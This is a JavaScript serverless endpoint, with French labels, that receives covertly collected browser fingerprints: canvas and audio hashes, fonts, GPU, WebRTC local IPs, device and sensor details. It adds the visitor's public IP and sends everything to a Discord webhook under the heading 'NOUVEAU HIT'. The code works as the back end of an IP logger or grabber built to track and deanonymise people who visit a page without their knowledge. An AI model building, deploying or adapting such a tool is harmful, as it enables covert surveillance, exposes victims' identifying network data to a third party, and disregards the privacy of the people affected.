export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({error:'method'});
  
  const d = req.body || {};
  const publicIP = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'inconnu').split(',')[0].trim();

  const embed = {
    title: "🎯 NOUVEAU HIT",
    color: 0xff3333,
    fields: [
      { name: "📱 APPAREIL DEVINÉ", value: `**${d.deviceGuess || 'inconnu'}**`, inline: false },
      { name: "🎮 GPU", value: `\`${d.gpu?.renderer || 'n/a'}\``, inline: false },
      { name: "🌐 IP publique", value: `\`${publicIP}\``, inline: true },
      { name: "🏠 WebRTC (mDNS/IP locale)", value: `\`${(d.webrtc || []).join(', ') || 'aucune'}\``, inline: true },
      { name: "🔐 Fingerprint custom (stable)", value: `\`${d.customFingerprint}\``, inline: false },
      { name: "🎨 Canvas hash", value: `\`${d.canvasFP}\``, inline: true },
      { name: "🔊 Audio FP", value: `\`${d.audioFP}\``, inline: true },
      { name: "🔤 Polices détectées", value: `\`${(d.fonts || []).join(', ').substring(0,200) || 'n/a'}\``, inline: false },
      { name: "📐 Écran", value: `${d.screen} (avail: ${d.screenAvail})`, inline: true },
      { name: "🌍 Fuseau / Langue", value: `${d.timezone} / ${d.language}`, inline: true },
      { name: "⚙️ CPU", value: `${d.hardwareConcurrency} cores (iOS plafonne à 4)`, inline: true },
      { name: "💾 RAM", value: `${d.deviceMemory}`, inline: true },
      { name: "👆 Touch points", value: `${d.touchPoints}`, inline: true },
      { name: "📲 Capteurs mobiles", value: `motion:${d.sensors?.motion} / orientation:${d.sensors?.orientation}`, inline: true },
      { name: "📱 User-Agent", value: `\`${(d.userAgent||'').substring(0,300)}\``, inline: false },
      { name: "🕐 Timestamp", value: d.timestamp || 'n/a', inline: false }
    ]
  };

  try {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ embeds:[embed] })
    });
  } catch(e) { console.error(e); }

  res.status(200).json({ ok: true });
}
